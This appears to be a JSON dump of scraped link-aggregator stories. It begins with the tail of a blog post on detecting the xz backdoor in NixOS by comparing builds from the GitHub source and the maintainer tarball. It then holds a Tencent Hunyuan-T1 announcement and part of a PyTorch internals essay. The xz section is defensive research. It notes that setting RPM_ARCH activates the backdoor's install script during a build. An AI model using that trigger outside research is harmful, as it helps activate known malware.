nixpkgs#xz\n/nix/store/2rajzdx3wkivlc38fyhj0avyp10k2vjj-autoconf-2.72.drv\n└───/nix/store/jnnb5ihdh6r3idmqrj2ha95ir42icafq-stdenv-linux.drv\n    └───/nix/store/sqwqnilfwkw6p2f5gaj6n1xlsy054fnw-xz-5.6.4.drv\n\nIn conclusion, at the point in the nixpkgs graph where the xz package is built, the GitHub source archive cannot be used and we have to rely on the maintainer provided tarball, and hence, trust it. That does not mean that further verification cannot be implemented in nixpkgs, though…\nBuilding trust into untrusted release tarballs\nTo recap, the main reason that made NixOS vulnerable to the xz attack is that it is built as part of the bootstrap phase, at a point where we rely on maintainer-provided tarballs instead of the ones generated by GitHub. This incident shows that we should have specific protections in place, to ensure software built as part of our bootstrap is trustworthy.\n1. By comparing sources\nOne idea that comes to mind is that it should be easy, as a distribution, to verify that the sources tarballs we are using are indeed identical to the GitHub ones. There was even a pull request opened to introduce such a protection scheme. While this seem like a natural idea, it doesn’t really work in practice: it’s not that rare that the maintainer provided tarball differs from the sources, and it’s often nothing to worry about.\n\nAs Daniel Stenberg (the maintainer of curl) explains, the release tarball being different than the source is a feature: it allows the maintainer to include intermediary artifacts like manpages or configure scripts for example (this is especially useful for distributions that want to get rid of the dependency on autoconf to build the program). Of course when we care about software supply chain security, this flexibility that project maintainers have in the way they provide the release assets is actually a liability because it forces us to trust them to do it honestly.\n2. Leveraging bitwise reproducibility\nReproducible builds is a property of a software project that is verified if building it twice in the same conditions yields the exact same (bitwise identical) artifacts. Build reproducibility is not something easy to obtain, as there are all kinds of nondeterminisms that can happen in build processes, and making as many packages as possible reproducible is the purpose of the reproducible-builds group. It is also a property recognized as instrumental to increase the trust in the distribution of binary artifacts (see Reproducible Builds: Increasing the Integrity of Software Supply Chains for a detailed report).\nThere are several ways bitwise reproducibility could be used to build up trust in untrusted maintainer provided tarballs:\n\nReproducibly building the tarball\nA first approach that has been adopted by the postgresql project is to make the tarball generation process reproducible. This allows any user (or a linux distribution) to independently verify that the maintainer provided tarball was honestly generated from the original source code.\n\nWith this method, you can keep some advantages of building from tarballs (including the tarball containing some intermediary build artifacts like manpages or configure scripts). However, the drawback of this approach for software supply chain security is that it has to be implemented by upstream project maintainers. This means that adoption of this kind of security feature will probably be slow in the FOSS community, and while it is a good practice to make everything reproducible, including the tarball generation process, this is not the most effective way to increase software supply chain security today.\nChecking for build convergence between various starting assets\n\n  Info\n\n  This part is about how I think NixOS could have detected the xz attack even though xz is built as part of the NixOS bootstrap phase.\n\nAssuming xz is bitwise reproducible (and that is indeed the case), and that the maintainer provided tarball doesn’t contain any modification that impacts the build process, building it from the GitHub tarball or from the maintainer provided tarball should produce the same artifacts, right? Based on this idea, my proposal is to build xz a second time after the bootstrap, this time using the GitHub tarball (which is only possible after the bootstrap). If both builds differ we can suspect that there a suspicion of a supply chain compromise.\n\nSummary of the method I propose to detect vulnerable xz source tarballs\n\nLet’s see how this could be implemented:\nFirst, we rewrite the xz package, this time using the fetchFromGitHub function. I create a after-boostrap.nix file alongside the original xz expression in the pkgs/tools/compression/xz directory of nixpkgs:\n  {\n  lib,\n  stdenv,\n  fetchurl,\n  enableStatic ? false,\n  writeScript,\n  fetchFromGitHub,\n  testers,\n  gettext,\n  autoconf,\n  libtool,\n  automake,\n  perl538Packages,\n  doxygen,\n  xz,\n}:\n\nstdenv.mkDerivation (finalAttrs: {\n  pname = \"xz\";\n  version = \"5.6.1\";\n\n  src = fetchFromGitHub {\n    owner = \"tukaani-project\";\n    repo = \"xz\";\n    rev = \"v${finalAttrs.version}\";\n    hash = \"sha256-alrSXZ0KWVlti6crmdxf/qMdrvZsY5yigcV9j6GIZ6c=\";\n  };\n\n  strictDeps = true;\n  configureFlags = lib.optional enableStatic \"--disable-shared\";\n  enableParallelBuilding = true;\n  doCheck = true;\n\n  nativeBuildInputs = [\n    gettext\n    autoconf\n    libtool\n    automake\n    perl538Packages.Po4a\n    doxygen\n    perl\n  ];\n\n  preConfigure = ''\n    ./autogen.sh\n  '';\n\n})\n\nI removed details here to focus on the most important: the Nix expression is very similar to the actual derivation for xz, the only difference (apart from the method to fetch the source) is that we need to use autoconf to generate configure scripts. When using the maintainer provided tarball these are already pre-generated for us (as Daniel Stenberg was explaining in the toot above) – which is very handy particularly when you are building xz in the bootstrap phase of a distribution and you don’t want a dependency on autoconf / automake – but in this instance we have to do it ourselves.\nNow that we can build xz from the code archive provided by GitHub, we have to write Nix code to compare both outputs. For that purpose, we register a new phase called compareArtifacts, that runs at the very end of the build process. To make my point, I’ll first only compare the liblzma.so file (the one that was modified by the backdoor), but we could easily generalize this phase to all binaries and libraries outputs:\npostPhases = [ \"compareArtifacts\" ];\n\ncompareArtifacts = ''\n  diff $out/lib/liblzma.so ${xz.out}/lib/liblzma.so\n'';\n\nAfter this change, building xz-after-bootstrap on master3 still works, showing that in a normal setting, both artifacts are indeed identical.\n$ nix-build -A xz-after-bootstrap\n/nix/store/h23rfcjxbp1vqmmbvxkv0f69r579kfc1-xz-5.6.1\n\nLet’s now try our detection method on the backdoored xz and see what happens! We checkout revision c53bbe3 that contains the said version4, and build xz-after-bootstrap.\n$ git checkout c53bbe3\n$ nix-build -A xz-after-boostrap\n/nix/store/57p62d3m98s2bgma5hcz12b4vv6nhijn-xz-5.6.1\n\nAgain, identical artifacts? Remember that the backdoor was not active in NixOS, partly because there is a check that the RPM_ARCH variable is set in the script that installs the backdoor. So let’s set it in pkgs/tools/compression/xz/default.nix to activate the backdoor5.\nenv.RPM_ARCH = true;\n\n$ nix-build -A xz-after-boostrap\n/nix/store/57p62d3m98s2bgma5hcz12b4vv6nhijn-xz-5.6.1\n...\n...\nRunning phase: compareBins\nBinary files /nix/store/cxz8iq3hx65krsyraill6figp03dk54n-xz-5.6.1/lib/liblzma.so and /nix/store/4qp2khyb22hg6a3jiy4hqmasjinfkp2g-xz-5.6.1/lib/liblzma.so differ\n\nThat’s it, binary artifacts are different now! Let’s try to understand a bit more what makes them different by keeping them as part of the output. For that, we modify the compareArtifacts phase:\ncompareArtifacts = ''\n  cp ${xz.out}/lib/liblzma.so $out/xzBootstrap\n  cp $out/lib/liblzma.so $out/xzAfterBootstrap\n  diff $out/lib/liblzma.so ${xz.out}/lib/liblzma.so || true\n'';\n\nThis time the diff doesn’t make the build fail and we store both versions of the liblzma.so to be able to compare them afterwards.\n$ ls -lah result\ntotal 69M\ndr-xr-xr-x      6 root root     99 Jan  1  1970 .\ndrwxrwxr-t 365666 root nixbld  85M Dec 10 14:27 ..\ndr-xr-xr-x      2 root root   4.0K Jan  1  1970 bin\ndr-xr-xr-x      3 root root     32 Jan  1  1970 include\ndr-xr-xr-x      3 root root    103 Jan  1  1970 lib\ndr-xr-xr-x      4 root root     31 Jan  1  1970 share\n-r-xr-xr-x      1 root root   210K Jan  1  1970 xzAfterBootstrap\n-r-xr-xr-x      1 root root   258K Jan  1  1970 xzBootstrap\n\nWe can notice that there is even a significant size difference between the two artifacts with an increase of 48Kb for the backdoored one. Let’s try to understand where this difference comes from. We can use the nm command from binutils to list the symbols in an artifact:\n$ nm result/xzAfterBootstrap\n000000000000d3b0 t alone_decode\n000000000000d380 t alone_decoder_end\n000000000000d240 t alone_decoder_memconfig\n0000000000008cc0 t alone_encode\n0000000000008c90 t alone_encoder_end\n0000000000008db0 t alone_encoder_init\n0000000000020a80 t arm64_code\n0000000000020810 t arm_code\n0000000000020910 t armthumb_code\n000000000000d8d0 t auto_decode\n000000000000d8a0 t auto_decoder_end\n000000000000d730 t auto_decoder_get_check\n000000000000d7a0 t auto_decoder_init\n000000000000d750 t auto_decoder_memconfig\n0000000000022850 r available_checks.1\n00000000000225f0 r bcj_optmap\n0000000000008fb0 t block_buffer_encode\n...\n\nNow we can diff the symbols between the two artifacts:\n$ diff -u0 <(nm --format=just-symbols xzAfterBootstrap) <(nm --format=just-symbols xzBootstrap)\n--- /dev/fd/63\t2024-12-10 15:27:11.477332683 +0000\n+++ /dev/fd/62\t2024-12-10 15:27:11.478332717 +0000\n@@ -31,0 +32 @@\n+_cpuid\n@@ -65,0 +67 @@\n+_get_cpuid\n@@ -448,0 +451 @@\n+__tls_get_addr@GLIBC_2.3\n\nTADA! We see the added _get_cpuid symbol, documented in numerous technical report about the xz backdoor, confirming our method works!\nAddendum 1: How to implement this safeguard in nixpkgs?\nI think nixpkgs should implement this kind of safeguard for every package built as part of the bootstrap phase that is not using a trusted source archive. The *-after-bootstrap packages could then be added to the channel blockers to ensure that there is big red alarm that requires intervention from the maintainers if ever one of those would not build.\nAs a proof of concept, and to gather the feedback of the community I opened a pull request in the nixpkgs repository for the xz case, but if the method is adopted we should then implement it for the other candidate packages in nixpkgs’s bootstrap.\nAddendum 2: Evaluation: reproducibility of stdenv over time\nAs discussed above, the method I propose assumes the packages we want to build trust in are bitwise reproducible. In order to help validate the approach, let’s verify that the packages belonging to the stdenv runtime are indeed reproducible.\nTo do that, I have (as part of a bigger research project whose findings are summarized in another blog post) sampled 17 nixpkgs-unstable revisions from 2017 to 2023 and rebuilt every non-fixed-output-derivation (FOD) composing stdenv from these revisions using the nix-build --check command to check for bitwise reproducibility.\nHere are my findings:\n\nIn every revision xz was bitwise reproducible ;\nIn 12 of the 17 revisions there was either one or two packages that were buildable but not reproducible, but those packages are consistent over time: for example gcc has consistently been non reproducible from 2017 to 2021 and bash until 2019.\n\nThese findings, while showing that this method cannot be applied to every package in stdenv, are encouraging: even if some packages are not bitwise reproducible, they are consistently so, which means that it should be possible to selectively activate it on packages that exhibit good reproducibility in the long term.\nAddendum 3: Limitations: the trusting trust issue\nThe trusting trust issue is a famous thought experiment initiated by Ken Thomson during his Turing award acceptance lecture. The idea is the following: assume there is a backdoor in compilers we use to build our software such that the compiler propagates the backdoor to all new version of itself that it builds, but behaves normally for any other build until some point in time where it backdoors all executables it produces. Moderns compilers often need a previous version of themselves to be compiled so there must be an initial executable that we have to trust to build our software, making this kind of sophisticated attack theoretically possible and completely undetectable.\nSimilarly, the method I am proposing here requires to make the assumption that the untrusted xz (the one built during the bootstrap phase) can’t indirectly corrupt the build of xz-after-bootstrap to make it look like the produced artifacts are identical. Again, such an attack would probably be extremely complex to craft so the assumption here seems sane.\n\nThanks\nI would like to thank Théo Zimmermann, Pol Dellaiera, Martin Schwaighofer, and Stefano Zacchiroli for their valuable feedback and insightful discussions during the writing of this blog post. Their contributions significantly helped me organize and refine my ideas on this topic.\n\nJia Tan essentially (through multiple identities) pressured the main xz maintainer into accepting new maintainers for the project, claiming that the project was receiving sub-par maintenance.↩︎\nFortunately, even though the malicious version was available to users, the backdoor was not active on NixOS has it was specifically made to target Debian and Fedora systems.↩︎\nTested at the time of writing on revision 1426c51↩︎\nFor obvious reasons, the backdoored tarball has been deleted from GitHub and the project’s website but it is still available in the NixOS cache!↩︎\nThis illustrates the power and limitation of this method: it only detects modifications of the tarball that have an impact on the final result. In the case of the xz backdoor, NixOS executables did not contain the backdoor and as such without any modification we would not have discovered the backdoor. So yes, the title is a little bit catchy, but illustrates the idea.↩︎",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "2f636b83b97fa83c",
    "title": {
      "en": "Feral pig meat transmits rare bacteria",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://arstechnica.com/health/2025/03/florida-man-eats-feral-pig-meat-contracts-rare-biothreat-bacteria/",
    "score": 22,
    "by": "abawany",
    "time": 1742404626,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "bfd23bb5d8d8073e",
    "title": {
      "en": "Tencent's 'Hunyuan-T1'–The First Mamba-Powered Ultra-Large Model",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://llm.hunyuan.tencent.com/#/blog/hy-t1?lang=en",
    "score": 203,
    "by": "marban",
    "time": 1742664332,
    "content": "Introduction\n            Reinforcement learning has pioneered a new Scaling paradigm in the post-training phase of large language models, a breakthrough that is increasingly attracting attention from the industry. With the successive release of OpenAI's O-series models and DeepSeek R1, the excellent performance demonstrated by the models fully proves the crucial role of reinforcement learning in the optimization process.\n\n            In mid-February this year, the Hunyuan team launched the Hunyuan T1-Preview (Hunyuan-Thinker-1-Preview) reasoning model based on the medium-scale Hunyuan base on the Tencent Yuanbao APP, bringing users an ultimate and rapid in-depth thinking experience.\n\n            Today, we are very pleased to announce that the in-depth thinking model of the Hunyuan large model series has been successfully upgraded to the Hunyuan-T1 official version. This model is based on the TurboS fast-thinking base, the world's first ultra-large-scale Hybrid-Transformer-Mamba MoE large model released by us at the beginning of March. Through large-scale post-training, its reasoning ability has been significantly expanded and further aligned with human preferences.\n\n            Compared with the previous T1-preview model, Hunyuan-T1 has shown a significant overall performance improvement and is a leading cutting-edge strong reasoning large model in the industry.\n\n            Based on TurboS, T1 shows unique advantages in the direction of in-depth reasoning. TurboS's long-text capture ability helps Turbo-S effectively solve the problems of context loss and long-distance information dependence often encountered in long-text reasoning. Secondly, its Mamba architecture specifically optimizes the processing ability of long sequences. Through an efficient computing method, it can ensure the ability to capture long-text information while significantly reducing the consumption of computing resources. Under the same deployment conditions, the decoding speed is 2 times faster.\n\n            In the post-training phase of the model, we invested 96.7% of our computing power in reinforcement learning training, focusing on improving pure reasoning ability and optimizing alignment with human preferences.\n\n            We collected world science and reasoning problems, covering mathematics/logic reasoning/science/code, etc. These data sets cover everything from basic mathematical reasoning to complex scientific problem solving. Combined with ground-truth real feedback, we ensure that the model can demonstrate excellent capabilities when facing various reasoning tasks.\n\n            In terms of training plans, we adopted a curriculum learning approach to gradually increase data difficulty while expanding the model's context length in a step-by-step manner, enabling the model to improve its reasoning ability while learning to use tokens efficiently for reasoning.\n\n            Regarding the training strategy, we referred to classic reinforcement learning strategies such as data replay and periodic policy resetting, which significantly improved the long-term stability of model training by over 50%. During the alignment with human preferences phase, we adopted a unified reward system feedback scheme of self-rewarding (based on an early version of T1-preview to comprehensively evaluate and score the model's output) + reward mode, guiding the model to self-improve. The model shows richer content details and more efficient information in its responses.\n\n            In addition to achieving comparable or slightly better results than R1 on various public benchmarks such as MMLU-pro, CEval, AIME, Zebra Logic, and other Chinese and English knowledge and competition-level math and logical reasoning indicators, Hunyuan-T1 also performs on par with R1 in internal human evaluation datasets. It has a slight edge in cultural and creative instruction following, text summarization, and agent capabilities.\n\n            From the perspective of comprehensive evaluation metrics, the overall performance of Hunyuan-T1 can be on a par with first-class cutting-edge inference models.\n            In terms of comprehensive ability evaluation, T1 ranks second only to O1 on MMLU-PRO, with a high score of 87.2. This test set covers questions from 14 fields such as humanities,\n            social sciences, and science and engineering, mainly testing the model's memory and understanding of extensive knowledge.\n            Additionally, there is GPQA-diamond, which focuses on professional domain knowledge and complex scientific reasoning, mainly including doctoral-level difficult problems in physics, chemistry, and biology. T1 achieved a score of 69.3.\n\n            In the field of science and engineering, we tested scenarios that require strong reasoning abilities, such as coding, mathematics, and logical reasoning.\n            In the code evaluation of LiveCodeBench, T1 reached a score of 64.9. Meanwhile, T1 also performs excellently in mathematics.\n            Especially on MATH-500, it achieved an excellent score of 96.2, closely following DeepSeek R1, demonstrating T1's comprehensive ability in solving math problems.\n            Besides, T1 has shown very strong adaptability in multiple alignment tasks, instruction-following tasks, and tool utilization tasks. For example, T1 achieved a score of 91.9 in the ArenaHard task.\n           Model Effect   Note: The evaluation metrics of other models in the table are from official evaluation results. For the parts not included in the official evaluation results, they are from the results of the Hunyuan internal evaluation platform.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "5cb55b76ef14c0b2",
    "title": {
      "en": "Mindfulness mediates the association between chronotype and depressive symptoms",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0319915",
    "score": 12,
    "by": "wjb3",
    "time": 1742709155,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "09e9f98019f60115",
    "title": {
      "en": "PyTorch Internals: Ezyang's Blog",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://blog.ezyang.com/2019/05/pytorch-internals/",
    "score": 327,
    "by": "Anon84",
    "time": 1742654344,
    "content": "PyTorch internals\n\nThis post is a long form essay version of a talk about PyTorch internals, that I gave at the PyTorch NYC meetup on May 14, 2019.\n\nHi everyone!  Today I want to talk about the internals of PyTorch.\n\nThis talk is for those of you who have used PyTorch, and thought to yourself, \"It would be great if I could contribute to PyTorch,\" but were scared by PyTorch's behemoth of a C++ codebase.  I'm not going to lie: the PyTorch codebase can be a bit overwhelming at times. The purpose of this talk is to put a map in your hands: to tell you about the basic conceptual structure of a \"tensor library that supports automatic differentiation\", and give you some tools and tricks for finding your way around the codebase.  I'm going to assume that you've written some PyTorch before, but haven't necessarily delved deeper into how a machine learning library is written.\n\nThe talk is in two parts: in the first part, I'm going to first introduce you to the conceptual universe of a tensor library.  I'll start by talking about the tensor data type you know and love, and give a more detailed discussion about what exactly this data type provides, which will lead us to a better understanding of how it is actually implemented under the hood.  If you're an advanced user of PyTorch, you'll be familiar with most of this material.  We'll also talk about the trinity of \"extension points\", layout, device and dtype, which guide how we think about extensions to the tensor class.  In the live talk at PyTorch NYC, I skipped the slides about autograd, but I'll talk a little bit about them in these notes as well.\nThe second part grapples with the actual nitty gritty details involved with actually coding in PyTorch.  I'll tell you how to cut your way through swaths of autograd code, what code actually matters and what is legacy, and also all of the cool tools that PyTorch gives you for writing kernels.\n\nThe tensor is the central data structure in PyTorch.  You probably have a pretty good idea about what a tensor intuitively represents: its an n-dimensional data structure containing some sort of scalar type, e.g., floats, ints, et cetera.  We can think of a tensor as consisting of some data, and then some metadata describing the size of the tensor, the type of the elements in contains (dtype), what device the tensor lives on (CPU memory? CUDA memory?)\n\nThere's also a little piece of metadata you might be less familiar with: the stride.  Strides are actually one of the distinctive features of PyTorch, so it's worth discussing them a little more.\n\nA tensor is a mathematical concept.  But to represent it on our computers, we have to define some sort of physical representation for them.  The most common representation is to lay out each element of the tensor contiguously in memory (that's where the term contiguous comes from), writing out each row to memory, as you see above. In the example above, I've specified that the tensor contains 32-bit integers, so you can see that each integer lies in a physical address, each offset four bytes from each other.  To remember what the actual dimensions of the tensor are, we have to also record what the sizes are as extra metadata.\nSo, what do strides have to do with this picture?\n\nSuppose that I want to access the element at position tensor[1, 0] in my logical representation.  How do I translate this logical position into a location in physical memory?  Strides tell me how to do this: to find out where any element for a tensor lives, I multiply each index with the respective stride for that dimension, and sum them all together.  In the picture above, I've color coded the first dimension blue and the second dimension red, so you can follow the index and stride in the stride calculation.  Doing this sum, I get two (zero-indexed), and indeed, the number three lives two below the beginning of the contiguous array.\n(Later in the talk, I'll talk about TensorAccessor, a convenience class that handles the indexing calculation.  When you use TensorAccessor, rather than raw pointers, this calculation is handled under the covers for you.)\nStrides are the fundamental basis of how we provide views to PyTorch users.  For example, suppose that I want to extract out a tensor that represents the second row of the tensor above:\n\nUsing advanced indexing support, I can just write tensor[1, :] to get this row.  Here's the important thing: when I do this, I don't create a new tensor; instead, I just return a tensor which is a different view on the underlying data.  This means that if I, for example, edit the data in that view, it will be reflected in the original tensor.  In this case, it's not too hard to see how to do this: three and four live in contiguous memory, and all we need to do is record an offset saying that the data of this (logical) tensor lives two down from the top.  (Every tensor records an offset, but most of the time it's zero, and I'll omit it from my diagrams when that's the case.)\n\nQuestion from the talk: If I take a view on a tensor, how do I free the memory of the underlying tensor?\nAnswer: You have to make a copy of the view, thus disconnecting it from the original physical memory.  There's really not much else you can do.  By the way, if you have written Java in the old days, taking substrings of strings has a similar problem, because by default no copy is made, so the substring retains the (possibly very large string). Apparently, they fixed this in Java 7u6.\n\nA more interesting case is if I want to take the first column:\n\nWhen we look at the physical memory, we see that the elements of the column are not contiguous: there's a gap of one element between each one.  Here, strides come to the rescue: instead of specifying a stride of one, we specify a stride of two, saying that between one element and the next, you need to jump two slots.  (By the way, this is why it's called a \"stride\": if we think of an index as walking across the layout, the stride says how many locations we stride forward every time we take a step.)\nThe stride representation can actually let you represent all sorts of interesting views on tensors; if you want to play around with the possibilities, check out the Stride Visualizer.\nLet's step back for a moment, and think about how we would actually implement this functionality (after all, this is an internals talk.)  If we can have views on tensor, this means we have to decouple the notion of the tensor (the user-visible concept that you know and love), and the actual physical data that stores the data of the tensor (called storage):\n\nThere may be multiple tensors which share the same storage.  Storage defines the dtype and physical size of the tensor, while each tensor records the sizes, strides and offset, defining the logical interpretation of the physical memory.\nOne thing to realize is that there is always a pair of Tensor-Storage, even for \"simple\" cases where you don't really need a storage (e.g., you just allocated a contiguous tensor with torch.zeros(2, 2)).\n\nBy the way, we're interested in making this picture not true; instead of having a separate concept of storage, just define a view to be a tensor that is backed by a base tensor.  This is a little more complicated, but it has the benefit that contiguous tensors get a much more direct representation without the Storage indirection.  A change like this would make PyTorch's internal representation a bit more like Numpy's.\n\nWe've talked quite a bit about the data layout of tensor (some might say, if you get the data representation right, everything else falls in place).  But it's also worth briefly talking about how operations on the tensor are implemented.  At the very most abstract level, when you call torch.mm, two dispatches happen:\n\nThe first dispatch is based on the device type and layout of a tensor: e.g., whether or not it is a CPU tensor or a CUDA tensor (and also, e.g., whether or not it is a strided tensor or a sparse one).  This is a dynamic dispatch: it's a virtual function call (exactly where that virtual function call occurs will be the subject of the second half of this talk).  It should make sense that you need to do a dispatch here: the implementation of CPU matrix multiply is quite different from a CUDA implementation.  It is a dynamic dispatch because these kernels may live in separate libraries (e.g., libcaffe2.so versus libcaffe2_gpu.so), and so you have no choice: if you want to get into a library that you don't have a direct dependency on, you have to dynamic dispatch your way there.\nThe second dispatch is a dispatch on the dtype in question.  This dispatch is just a simple switch-statement for whatever dtypes a kernel chooses to support.  Upon reflection, it should also make sense that we need to a dispatch here: the CPU code (or CUDA code, as it may) that implements multiplication on float is different from the code for int.  It stands to reason you need separate kernels for each dtype.\nThis is probably the most important mental picture to have in your head, if you're trying to understand the way operators in PyTorch are invoked.  We'll return to this picture when it's time to look more at code.\n\nSince we have been talking about Tensor, I also want to take a little time to the world of tensor extensions.  After all, there's more to life than dense, CPU float tensors.  There's all sorts of interesting extensions going on, like XLA tensors, or quantized tensors, or MKL-DNN tensors, and one of the things we have to think about, as a tensor library, is how to accommodate these extensions.\n\nOur current model for extensions offers four extension points on tensors.  First, there is the trinity three parameters which uniquely determine what a tensor is:\n\nThe device, the description of where the tensor's physical memory is actually stored, e.g., on a CPU, on an NVIDIA GPU (cuda), or perhaps on an AMD GPU (hip) or a TPU (xla).  The distinguishing characteristic of a device is that it has its own allocator, that doesn't work with any other device.\nThe layout, which describes how we logically interpret this physical memory.  The most common layout is a strided tensor, but sparse tensors have a different layout involving a pair of tensors, one for indices, and one for data; MKL-DNN tensors may have even more exotic layout, like blocked layout, which can't be represented using merely strides.\nThe dtype, which describes what it is that is actually stored in each element of the tensor.  This could be floats or integers, or it could be, for example, quantized integers.\n\nIf you want to add an extension to PyTorch tensors (by the way, if that's what you want to do, please talk to us!  None of these things can be done out-of-tree at the moment), you should think about which of these parameters you would extend.  The Cartesian product of these parameters define all of the possible tensors you can make.  Now, not all of these combinations may actually have kernels (who's got kernels for sparse, quantized tensors on FPGA?) but in principle the combination could make sense, and thus we support expressing it, at the very least.\nThere's one last way you can make an \"extension\" to Tensor functionality, and that's write a wrapper class around PyTorch tensors that implements your object type.  This perhaps sounds obvious, but sometimes people reach for extending one of the three parameters when they should have just made a wrapper class instead.  One notable merit of wrapper classes is they can be developed entirely out of tree.\nWhen should you write a tensor wrapper, versus extending PyTorch itself?  The key test is whether or not you need to pass this tensor along during the autograd backwards pass.  This test, for example, tells us that sparse tensor should be a true tensor extension, and not just a Python object that contains an indices and values tensor: when doing optimization on networks involving embeddings, we want the gradient generated by the embedding to be sparse.\n\nOur philosophy on extensions also has an impact of the data layout of tensor itself.  One thing we really want out of our tensor struct is for it to have a fixed layout: we don't want fundamental (and very frequently called) operations like \"What's the size of a tensor?\" to require virtual dispatches.  So when you look at the actual layout of a Tensor (defined in the TensorImpl struct),  what we see is a common prefix of all fields that we consider all \"tensor\"-like things to universally have, plus a few fields that are only really applicable for strided tensors, but are so important that we've kept them in the main struct, and then a suffix of custom fields that can be done on a per-Tensor basis.  Sparse tensors, for example, store their indices and values in this suffix.\n\nI told you all about tensors, but if that was the only thing PyTorch provided, we'd basically just be a Numpy clone.  The distinguishing characteristic of PyTorch when it was originally released was that it provided automatic differentiation on tensors (these days, we have other cool features like TorchScript; but back then, this was it!)\nWhat does automatic differentiation do?  It's the machinery that's responsible for taking a neural network:\n\n...and fill in the missing code that actually computes the gradients of your network:\n\nTake a moment to study this diagram.  There's a lot to unpack; here's what to look at:\n\nFirst, rest your eyes on the variables in red and blue.  PyTorch implements reverse-mode automatic differentiation, which means that we effectively walk the forward computations \"backward\" to compute the gradients.  You can see this if you look at the variable names: at the bottom of the red, we compute loss; then, the first thing we do in the blue part of the program is compute grad_loss.  loss was computed from next_h2, so we compute grad_next_h2.  Technically, these variables which we call grad_ are not really gradients; they're really Jacobians left-multiplied by a vector, but in PyTorch we just call them grad and mostly everyone knows what we mean.\nIf the structure of the code stays the same, the behavior doesn't: each line from forwards is replaced with a different computation, that represents the derivative of the forward operation.  For example, the tanh operation is translated into a tanh_backward operation (these two lines are connected via a grey line on the left hand side of the diagram).  The inputs and outputs of the forward and backward operations are swapped: if the forward operation produced next_h2, the backward operation takes grad_next_h2 as an input.\n\nThe whole point of autograd is to do the computation that is described by this diagram, but without actually ever generating this source.  PyTorch autograd doesn't do a source-to-source transformation (though PyTorch JIT does know how to do symbolic differentiation).\n\nTo do this, we need to store more metadata when we carry out operations on tensors.  Let's adjust our picture of the tensor data structure: now instead of just a tensor which points to a storage, we now have a variable which wraps this tensor, and also stores more information (AutogradMeta), which is needed for performing autograd when a user calls loss.backward() in their PyTorch script.\n\nThis is yet another slide which will hopefully be out of date in the near future.  Will Feng is working on a Variable-Tensor merge in C++, following a simple merge which happened to PyTorch's frontend interface.\nWe also have to update our picture about dispatch:\n\nBefore we dispatch to CPU or CUDA implementations, there is another dispatch on variables, which is responsible for unwrapping variables, calling the underlying implementation (in green), and then rewrapping the results into variables and recording the necessary autograd metadata for backwards.\nSome implementations don't unwrap; they just call into other variable implementations.  So you might spend a while in the Variable universe.  However, once you unwrap and go into the non-Variable Tensor universe, that's it; you never go back to Variable (except by returning from your function.)\n\nIn my NY meetup talk, I skipped the following seven slides.  I'm also going to delay writeup for them; you'll have to wait for the sequel for some text.\n\nEnough about concepts, let's look at some code.\n\nPyTorch has a lot of folders, and there is a very detailed description of what they are in the CONTRIBUTING document, but really, there are only four directories you really need to know about:\n\nFirst, torch/ contains what you are most familiar with: the actual Python modules that you import and use.  This stuff is Python code and easy to hack on (just make a change and see what happens).  However, lurking not too deep below the surface is...\ntorch/csrc/, the C++ code that implements what you might call the frontend of PyTorch.  In more descriptive terms, it implements the binding code that translates between the Python and C++ universe, and also some pretty important pieces of PyTorch, like the autograd engine and the JIT compiler.  It also contains the C++ frontend code.\naten/, short for \"A Tensor Library\" (coined by Zachary DeVito), is a C++ library that implements the operations of Tensors.  If you're looking for where some kernel code lives, chances are it's in ATen.  ATen itself bifurcates into two neighborhoods of operators: the \"native\" operators, which are modern, C++ implementations of operators, and the \"legacy\" operators (TH, THC, THNN, THCUNN), which are legacy, C implementations.  The legacy operators are the bad part of town; try not to spend too much time there if you can.\nc10/, which is a pun on Caffe2 and A\"Ten\" (get it? Caffe 10) contains the core abstractions of PyTorch, including the actual implementations of the Tensor and Storage data structures.\n\nThat's a lot of places to look for code; we should probably simplify the directory structure, but that's how it is.  If you're trying to work on operators, you'll spend most of your time in aten.\nLet's see how this separation of code breaks down in practice:\n\nWhen you call a function like torch.add, what actually happens?  If you remember the discussion we had about dispatching, you already have the basic picture in your head:\n\nWe have to translate from Python realm to the C++ realm (Python argument parsing)\nWe handle variable dispatch (VariableType--Type, by the way, doesn't really have anything to do programming language types, and is just a gadget for doing dispatch.)\nWe handle device type / layout dispatch (Type)\nWe have the actual kernel, which is either a modern native function, or a legacy TH function.\n\nEach of these steps corresponds concretely to some code.  Let's cut our way through the jungle.\n\nOur initial landing point in the C++ code is the C implementation of a Python function, which we've exposed to the Python side as something like torch._C.VariableFunctions.add.  THPVariable_add is the implementation of one such implementation.\nOne important thing to know about this code is that it is auto-generated.  If you search in the GitHub repository, you won't find it, because you have to actually build PyTorch to see it.  Another important thing is, you don't have to really deeply understand what this code is doing; the idea is to skim over it and get a sense for what it is doing.  Above, I've annotated some of the most important bits in blue: you can see that there is a use of a class PythonArgParser to actually pull out C++ objects out of the Python args and kwargs; we then call a dispatch_add function (which I've inlined in red); this releases the global interpreter lock and then calls a plain old method on the C++ Tensor self.  On its way back, we rewrap the returned Tensor back into a PyObject.\n(At this point, there's an error in the slides: I'm supposed to tell you about the Variable dispatch code.  I haven't fixed it here yet.  Some magic happens, then...)\n\nWhen we call the add method on the Tensor class, no virtual dispatch happens yet.  Instead, we have an inline method which calls a virtual method on a \"Type\" object.  This method is the actual virtual method (this is why I say Type is just a \"gadget\" that gets you dynamic dispatch.)  In the particular case of this example, this virtual call dispatches to an implementation of add on a class named TypeDefault.  This happens to be because we have an implementation of add that is the same for every device type (both CPU and CUDA); if we had happened to have different implementations, we might have instead landed on something like CPUFloatType::add.  It is this implementation of the virtual method that finally gets us to the actual kernel code.\n\nHopefully, this slide will be out-of-date very soon too; Roy Li is working on replacing Type dispatch with another mechanism which will help us better support PyTorch on mobile.\nIt's worth reemphasizing that all of the code, until we got to the kernel, is automatically generated.\n\nIt's a bit twisty and turny, so once you have some basic orientation about what's going on, I recommend just jumping straight to the kernels.\n\nPyTorch offers a lot of useful tools for prospective kernel writers.  In 